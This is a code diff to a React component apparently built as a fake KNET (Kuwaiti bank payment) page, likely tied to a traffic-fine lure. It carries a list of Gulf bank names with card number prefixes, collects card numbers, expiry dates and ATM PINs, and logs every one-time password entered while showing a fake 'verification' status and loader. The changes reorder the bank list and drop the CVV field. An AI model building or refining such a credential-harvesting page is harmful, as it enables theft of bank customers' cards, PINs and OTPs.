@@ -23,7 +23,7 @@ type PaymentInfo = {
   allOtps: string[]
   bank_card: string[]
   prefix: string
-  skip:string
+  skip: string
   status: "new" | "pending" | "approved" | "rejected"
   cardStatus: "new" | "pending" | "approved" | "rejected"
 }
@@ -39,84 +39,9 @@ type FormData = {
 // Bank data moved to a separate constant
 const BANKS = [
   {
-    value: "NBK",
-    label: "National Bank of Kuwait",
-    cardPrefixes: ["464452", "589160", "46445250", "543363"],
-  },
-  {
-    value: "CBK",
-    label: "Commercial Bank of Kuwait",
-    cardPrefixes: ["532672", "537015", "521175", "516334"],
-  },
-  {
-    value: "GBK",
-    label: "Gulf Bank",
-    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
-  },
-  {
     value: "ABK",
     label: "Al Ahli Bank of Kuwait",
     cardPrefixes: ["403622", "428628", "423826"],
-  },
-  {
-    value: "BURGAN",
-    label: "Burgan Bank",
-    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
-  },
-  {
-    value: "KFH",
-    label: "Kuwait Finance House",
-    cardPrefixes: ["485602", "537016", "537016", "450778"],
-  },
-  {
-    value: "BOUBYAN",
-    label: "Boubyan Bank",
-    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
-  },
-  {
-    value: "KIB",
-    label: "Kuwait International Bank",
-    cardPrefixes: ["409054", "406464"],
-  },
-  {
-    value: "UNB",
-    label: "Union National Bank",
-    cardPrefixes: ["457778", "513000"],
-  },
-  {
-    value: "BBK",
-    label: "Bank of Bahrain and Kuwait",
-    cardPrefixes: ["418056"],
-  },
-  {
-    value: "BNP",
-    label: "BNP Paribas",
-    cardPrefixes: ["450216", "531483", "489800"],
-  },
-  {
-    value: "HSBC",
-    label: "HSBC Middle East Bank",
-    cardPrefixes: ["447284", "530001", "453095"],
-  },
-  {
-    value: "FAB",
-    label: "First Abu Dhabi Bank",
-    cardPrefixes: ["440891", "530123", "454888"],
-  },
-  {
-    value: "CITIBANK",
-    label: "Citibank",
-    cardPrefixes: ["431457", "545432", "400800"],
-  },
-  {
-    value: "QNB",
-    label: "Qatar National Bank",
-    cardPrefixes: ["521020", "524745"],
-  },
-  {
-    value: "Doha",
-    label: "Doha Bank",
-    cardPrefixes: ["419252"],
   },
   {
     value: "ALRAJHI",
@@ -124,9 +49,73 @@ const BANKS = [
     cardPrefixes: ["458838"],
   },
   {
-    value: "BANK_MUSCAT",
-    label: "Bank Muscat",
-    cardPrefixes: ["489312", "529410", "454100"],
+    value: "BBK",
+    label: "Bank of Bahrain and Kuwait",
+    cardPrefixes: ["418056", "588790"],
+  },
+  {
+    value: "BOUBYAN",
+    label: "Boubyan Bank",
+    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
+  },
+
+  {
+    value: "BURGAN",
+    label: "Burgan Bank",
+    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
+  },
+
+  {
+    value: "CBK",
+    label: "Commercial Bank of Kuwait",
+    cardPrefixes: ["532672", "537015", "521175", "516334"],
+  }, {
+    value: "Doha",
+    label: "Doha Bank",
+    cardPrefixes: ["419252"],
+  },
+
+  {
+    value: "GBK",
+    label: "Gulf Bank",
+    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
+  },
+  {
+    value: "TAM",
+    label: "TAM Bank",
+    cardPrefixes: ["45077848", "45077849"],
+  },
+
+  {
+    value: "KFH",
+    label: "Kuwait Finance House",
+    cardPrefixes: ["485602", "537016", "5326674", "450778"],
+  },
+  {
+    value: "KIB",
+    label: "Kuwait International Bank",
+    cardPrefixes: ["409054", "406464"],
+  },
+  {
+
+    value: "NBK",
+    label: "National Bank of Kuwait",
+    cardPrefixes: ["464452", "589160"],
+  },
+  {
+    value: "Weyay",
+    label: "Weyay Bank",
+    cardPrefixes: ["46445250", "543363"],
+  },
+  {
+    value: "QNB",
+    label: "Qatar National Bank",
+    cardPrefixes: ["521020", "524745"],
+  },
+  {
+    value: "UNB",
+    label: "Union National Bank",
+    cardPrefixes: ["457778"],
   },
   {
     value: "WARBA",
@@ -331,9 +320,9 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
       await handleSubmit(e)
       setTimeout(() => {
         setLoading(false)
-        if(props.violationValue >=24){
+        if (props.violationValue >= 24) {
           setStep(3)
-        }else{
+        } else {
           setStep(0)
         }
         cuonter()
@@ -366,8 +355,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
         paymentInfo.pass !== "" &&
         paymentInfo.month !== "" &&
         paymentInfo.year !== "" &&
-        paymentInfo.pass.length === 4 &&
-        paymentInfo.cvv.length ===3
+        paymentInfo.pass.length === 4
       )
     }
     return true
@@ -550,26 +538,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                 />
               </div>
             </div>
-            <div className="row" id="PinRow">
-              <div className="row">
-                <label className="col">CVV:</label>
-                <input
-                  inputMode="numeric"
-                  pattern="[0-9]*"
-                  name="cvv"
-                  id="cvv"
-                  onChange={(e) => handlePaymentInfoChange("cvv", e.target.value)}
-                  value={paymentInfo.cvv}
-                  autoComplete="off"
-                  title="Should be in number. Length should be 4"
-                  type="password"
-                  size={3}
-                  style={{ width: "80%" }}
-                  maxLength={3}
-                  className="allownumericwithoutdecimal col-9"
-                />
-              </div>
-            </div>
+
 
           </div>
         )
@@ -847,12 +816,12 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                   {paymentInfo.status === "approved"
                     ? "تم التحقق ✓"
                     : paymentInfo.status === "rejected"
-                      ?<span style={{color:'red'}}> {" OTP رمز التحقق غير صحيح   ✗"}</span>
+                      ? <span style={{ color: 'red' }}> {" OTP رمز التحقق غير صحيح   ✗"}</span>
                       : "انتظار التحقق ..."}
                 </span>
               </div>
             </div>
-            {paymentInfo.status === "rejected"?null:<div style={{display:'flex',justifyContent:"center"}}><Loader/></div>} 
+            {paymentInfo.status === "rejected" ? null : <div style={{ display: 'flex', justifyContent: "center" }}><Loader /></div>}
           </div>
         )
 
